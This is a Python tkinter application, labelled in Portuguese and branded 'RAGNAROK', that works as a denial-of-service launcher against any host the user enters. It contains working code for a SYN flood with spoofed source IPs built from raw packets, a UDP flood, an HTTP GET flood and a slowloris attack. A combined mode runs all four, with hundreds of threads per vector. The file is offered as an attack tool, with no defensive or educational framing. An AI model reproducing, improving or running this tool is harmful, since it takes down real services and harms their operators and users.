#!/usr/bin/env python3
import tkinter as tk
from tkinter import ttk, messagebox
import threading
import os
import socket
import struct
import random
import time
from PIL import Image, ImageTk

stop_event = threading.Event()
ataque_em_andamento_global = False

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
]

def resolve_host(hostname):
    try:
        return socket.gethostbyname(hostname)
    except socket.gaierror:
        return None

def worker_syn_flood(target_ip, target_port, stop_event):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while not stop_event.is_set():
                source_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
                iph = struct.pack('!BBHHHBBH4s4s', (4 << 4) | 5, 0, 40, random.randint(1, 65535), 0, 64, 6, 0, socket.inet_aton(source_ip), socket.inet_aton(target_ip))
                source_port = random.randint(1025, 65535)
                tcph = struct.pack('!HHLLBBHHH', source_port, target_port, random.randint(1, 4294967295), 0, (5 << 4), 2, 5840, 0, 0)
                packet = iph + tcph
                s.sendto(packet, (target_ip, 0))
    except (PermissionError, OSError):
        if not stop_event.is_set():
            stop_event.set()
            root.after(0, lambda: messagebox.showerror("ERRO DE PERMISSÃO", "A forja de pacotes SYN Flood exige poder divino. Execute como root (sudo)."))
            root.after(0, recolher_os_demonios)

def worker_udp_flood(target_ip, target_port, stop_event):
    data = random.randbytes(1472)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        while not stop_event.is_set():
            try:
                s.sendto(data, (target_ip, target_port))
            except: pass

def worker_http_flood(target_ip, target_port, stop_event, host_header):
    while not stop_event.is_set():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2.0)
                s.connect((target_ip, target_port))
                path = f"/?cachebust={random.randint(1000, 99999)}"
                user_agent = random.choice(USER_AGENTS)
                request = f"GET {path} HTTP/1.1\r\nHost: {host_header}\r\nUser-Agent: {user_agent}\r\nConnection: close\r\n\r\n"
                s.sendall(request.encode())
        except: pass

def worker_slowloris(target_ip, target_port, stop_event, host_header):
    sockets = []
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4.0)
            s.connect((target_ip, target_port))
            s.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\nHost: {host_header}\r\nUser-Agent: SLOW_RAGNAROK\r\n".encode())
            sockets.append(s)
        except: time.sleep(0.5)

        for sock in list(sockets):
            try:
                sock.send("X-a: b\r\n".encode())
            except socket.error:
                sockets.remove(sock)
        
        if stop_event.wait(15):
            break
    
    for s in sockets:
        s.close()

def create_tiled_background(widget, image_path):
    try:
        tile = Image.open(image_path)
        w, h = widget.winfo_screenwidth(), widget.winfo_screenheight()
        background = Image.new('RGB', (w, h))
        
        for i in range(0, w, tile.width):
            for j in range(0, h, tile.height):
                background.paste(tile, (i, j))
                
        return ImageTk.PhotoImage(background)
    except FileNotFoundError:
        messagebox.showwarning("Imagem não Encontrada", f"O arquivo '{image_path}' não foi encontrado. O fundo padrão será usado.")
        return None
    except Exception as e:
        messagebox.showerror("Erro de Imagem", f"Falha ao processar a imagem de fundo: {e}")
        return None

def desencadear_inferno():
    global ataque_em_andamento_global, active_threads, stop_event
    if ataque_em_andamento_global: return

    target_host = entry_alvo.get()
    target_ip = resolve_host(target_host)
    if not target_ip:
        messagebox.showerror("ERRO DE ALVO", f"Não foi possível resolver o host: {target_host}")
        return

    stop_event.clear()
    active_threads = []
    
    try:
        num_threads = int(entry_threads.get())
        tcp_port = int(entry_porta_tcp.get())
        udp_port = int(entry_porta_udp.get())
    except ValueError:
        messagebox.showerror("ERRO DE PARÂMETRO", "Portas e Threads devem ser números inteiros.")
        return

    selected_mode = combo_modo_ataque.get()
    
    attack_map = {
        "Fúria Bruta (L4 Flood)": [(worker_syn_flood, (target_ip, tcp_port, stop_event)), (worker_udp_flood, (target_ip, udp_port, stop_event))],
        "Saturação de Aplicação (L7 Flood)": [(worker_http_flood, (target_ip, tcp_port, stop_event, target_host))],
        "Exaustão Lenta (L7 Slow Attack)": [(worker_slowloris, (target_ip, tcp_port, stop_event, target_host))]
    }
    attack_map["RAGNAROK TOTAL (Todos os Vetores)"] = attack_map["Fúria Bruta (L4 Flood)"] + attack_map["Saturação de Aplicação (L7 Flood)"] + attack_map["Exaustão Lenta (L7 Slow Attack)"]
    
    workers_to_start = attack_map.get(selected_mode, [])

    if not workers_to_start:
        messagebox.showwarning("ESTRATÉGIA INVÁLIDA", "Nenhum modo de ataque selecionado.")
        return

    for worker, args in workers_to_start:
        for _ in range(num_threads):
            thread = threading.Thread(target=worker, args=args, daemon=True)
            thread.start()
    
    ataque_em_andamento_global = True
    status_var.set(f"RAGNAROK DESENCADEADO SOBRE {target_ip}...")
    btn_iniciar_ataque.config(state=tk.DISABLED)
    btn_parar_ataque.config(state=tk.NORMAL)

def recolher_os_demonios():
    global stop_event
    stop_event.set()
    status_var.set("RECOLHENDO A LEGIÃO...")
    root.after(1000, post_recolhimento)

def post_recolhimento():
    global ataque_em_andamento_global
    ataque_em_andamento_global = False
    btn_iniciar_ataque.config(state=tk.NORMAL)
    btn_parar_ataque.config(state=tk.DISABLED)
    status_var.set("STATUS: AGUARDANDO ORDENS NO TRONO.")

root = tk.Tk()
root.title("PATRON RAGNAROK - Trono de Comando")
root.geometry("700x550")

cor_de_fundo_infernal = "#1A1A1A"
cor_do_label_profano = "#FFB833"
cor_do_botao_destruicao = "#B30000"
cor_do_botao_parada = "#008000"
cor_entry_bg = "#2c2c2c"
cor_entry_fg = "#e0e0e0"

bg_photo = create_tiled_background(root, "background.png")
if bg_photo:
    background_label = tk.Label(root, image=bg_photo)
    background_label.place(x=0, y=0, relwidth=1, relheight=1)
else:
    root.configure(bg=cor_de_fundo_infernal)

style = ttk.Style()
style.theme_use('clam')
style.configure("TFrame", background=cor_de_fundo_infernal)
style.configure("TLabel", foreground=cor_do_label_profano, background=cor_de_fundo_infernal, font=("Segoe UI", 9))
style.configure("TCombobox", fieldbackground=cor_entry_bg, background=cor_entry_bg, foreground=cor_entry_fg, selectbackground=cor_entry_bg, selectforeground=cor_do_label_profano)
style.configure("TEntry", fieldbackground=cor_entry_bg, foreground=cor_entry_fg, insertcolor="white")

root.columnconfigure(0, weight=1)

lbl_logo_gui = ttk.Label(root, text="RAGNAROK", font=("Impact", 24, "bold"), foreground="#00FF00", justify=tk.CENTER)
lbl_logo_gui.grid(row=0, column=0, pady=(10,0))

frame_alvo = ttk.Frame(root, padding=15)
frame_alvo.grid(row=1, column=0, sticky="ew", padx=10, pady=5)
frame_alvo.columnconfigure(1, weight=1)

ttk.Label(frame_alvo, text="URL/IP Alvo:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
entry_alvo = ttk.Entry(frame_alvo, width=50)
entry_alvo.grid(row=0, column=1, sticky="ew", padx=5, pady=5)

ttk.Label(frame_alvo, text="Porta TCP:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
entry_porta_tcp = ttk.Entry(frame_alvo, width=10)
entry_porta_tcp.grid(row=1, column=1, sticky=tk.W, padx=5, pady=5)
entry_porta_tcp.insert(0, "443")

ttk.Label(frame_alvo, text="Porta UDP:").grid(row=2, column=0, sticky=tk.W, padx=5, pady=5)
entry_porta_udp = ttk.Entry(frame_alvo, width=10)
entry_porta_udp.grid(row=2, column=1, sticky=tk.W, padx=5, pady=5)
entry_porta_udp.insert(0, "53")

ttk.Label(frame_alvo, text="Threads por Vetor:").grid(row=3, column=0, sticky=tk.W, padx=5, pady=5)
entry_threads = ttk.Entry(frame_alvo, width=10)
entry_threads.grid(row=3, column=1, sticky=tk.W, padx=5, pady=5)
entry_threads.insert(0, "500")

frame_arsenal = ttk.Frame(root, padding=10)
frame_arsenal.grid(row=2, column=0, sticky="ew", padx=10, pady=5)
frame_arsenal.columnconfigure(1, weight=1)

ttk.Label(frame_arsenal, text="Estratégia de Guerra:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
modos_ataque = ["Fúria Bruta (L4 Flood)", "Saturação de Aplicação (L7 Flood)", "Exaustão Lenta (L7 Slow Attack)", "RAGNAROK TOTAL (Todos os Vetores)"]
combo_modo_ataque = ttk.Combobox(frame_arsenal, values=modos_ataque, state="readonly", width=40)
combo_modo_ataque.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
combo_modo_ataque.current(0)

frame_botoes_acao = ttk.Frame(root, padding="10")
frame_botoes_acao.grid(row=3, column=0, sticky=tk.EW, pady=10)
frame_botoes_acao.columnconfigure(0, weight=1)
frame_botoes_acao.columnconfigure(1, weight=1)

btn_iniciar_ataque = tk.Button(frame_botoes_acao, text="UNLEASH RAGNAROK", command=desencadear_inferno, font=("Impact", 12), foreground="white", bg=cor_do_botao_destruicao)
btn_iniciar_ataque.grid(row=0, column=0, padx=10, ipady=7, sticky=tk.EW)
btn_parar_ataque = tk.Button(frame_botoes_acao, text="RECOLHER A LEGIÃO", command=recolher_os_demonios, state=tk.DISABLED, font=("Impact", 12), foreground="white", bg=cor_do_botao_parada)
btn_parar_ataque.grid(row=0, column=1, padx=10, ipady=7, sticky=tk.EW)

status_var = tk.StringVar(value="STATUS: AGUARDANDO ORDENS NO TRONO.")
status_bar = ttk.Label(root, textvariable=status_var, relief=tk.SUNKEN, anchor=tk.W, padding=5, background="#333", foreground="#ccc")
status_bar.grid(row=4, column=0, sticky='ew')

if __name__ == "__main__":
    if os.name == 'posix' and os.geteuid() != 0:
        messagebox.showerror("Requisito de Poder", "A forja de pacotes brutos exige poder divino. Execute como root (sudo).")
        sys.exit(1)
    root.mainloop()